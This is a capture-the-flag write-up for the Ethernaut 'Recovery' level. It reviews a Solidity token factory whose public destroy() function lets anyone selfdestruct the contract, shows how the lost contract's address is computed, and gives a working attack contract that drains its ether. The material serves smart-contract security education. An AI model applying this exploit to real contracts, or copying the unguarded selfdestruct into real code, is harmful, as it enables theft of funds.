<img src="https://ethernaut.openzeppelin.com/imgs/BigLevel17.svg">


# Target Contract Review

Given contract.

```solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Recovery {

  //generate tokens
  function generateToken(string memory _name, uint256 _initialSupply) public {
    new SimpleToken(_name, msg.sender, _initialSupply);
  
  }
}

contract SimpleToken {

  string public name;
  mapping (address => uint) public balances;

  // constructor
  constructor(string memory _name, address _creator, uint256 _initialSupply) {
    name = _name;
    balances[_creator] = _initialSupply;
  }

  // collect ether in return for tokens
  receive() external payable {
    balances[msg.sender] = msg.value * 10;
  }

  // allow transfers of tokens
  function transfer(address _to, uint _amount) public { 
    require(balances[msg.sender] >= _amount);
    balances[msg.sender] = balances[msg.sender] - _amount;
    balances[_to] = _amount;
  }

  // clean up after ourselves
  function destroy(address payable _to) public {
    selfdestruct(_to);
  }
}
```

Challenge's message:

> A contract creator has built a very simple token factory contract. Anyone can create new tokens with ease. After deploying the first token contract, the creator sent 0.001 ether to obtain more tokens. They have since lost the contract address. This level will be completed if you can recover (or remove) the 0.001 ether from the lost contract address.


## Contract Address Calculating


```solidity
bytes32 hash = keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), sender, bytes1(0x01)));
address addr = address(uint160(uint256(hash)));
```

More about [this topic.](https://ethereum.stackexchange.com/questions/760/how-is-the-address-of-an-ethereum-contract-computed)

# Subverting

```solidity
pragma solidity ^0.8.20;

import './Recovery.sol';

contract Attack{

    SimpleToken target;
    address public addr;

    constructor(address payable _challenge){
        bytes32 hash = keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), _challenge, bytes1(0x01)));
        addr = address(uint160(uint256(hash)));
        target = SimpleToken(addr);
    }

    function attack()external{
        target.destroy(payable(msg.sender));
    }

}
```


<p align="center"><img src=""></p>

<p align="center"><img src=""></p>


Ethernaut's message:

> Contract addresses are deterministic and are calculated by keccak256(address, nonce) where the address is the address of the contract (or ethereum address that created the transaction) and nonce is the number of contracts the spawning contract has created (or the transaction nonce, for regular transactions). Because of this, one can send ether to a pre-determined address (which has no private key) and later create a contract at that address which recovers the ether. This is a non-intuitive and somewhat secretive way to (dangerously) store ether without holding a private key.


**_by wasny0ps_**
